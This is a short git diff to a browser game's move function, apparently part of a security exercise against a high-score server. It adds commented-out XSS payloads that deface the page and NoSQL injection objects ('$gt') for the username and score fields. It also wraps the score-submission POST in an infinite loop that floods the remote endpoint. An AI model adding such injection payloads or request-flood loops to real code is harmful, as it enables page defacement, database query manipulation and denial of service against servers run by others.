@@ -143,19 +143,26 @@ GameManager.prototype.move = function (direction) {
 
       var grid_str = JSON.stringify(grid);
 
+      //username = "<script>alert('XSS')</scriipt><script>window.document.getElementByTagName('body').innerHTML='Hacker is Here';</script>";
+
+      //username = {"&gt": ""};
+      //score = {"$gt": ""};
+
       var send_info = {
         "username" : username,
         "grid" : grid_str,
         "score" : score
       };
   
+  while (true){
       $.ajax({
         type: "POST",
-        url: "https://peaceful-sands-84893.herokuapp.com/submit.json", 
+        url: "https://fast-forest-77151.herokuapp.com/submit.json", 
         data: send_info,
         success: null
       });
-    
+    }
+
 
   }; 
 
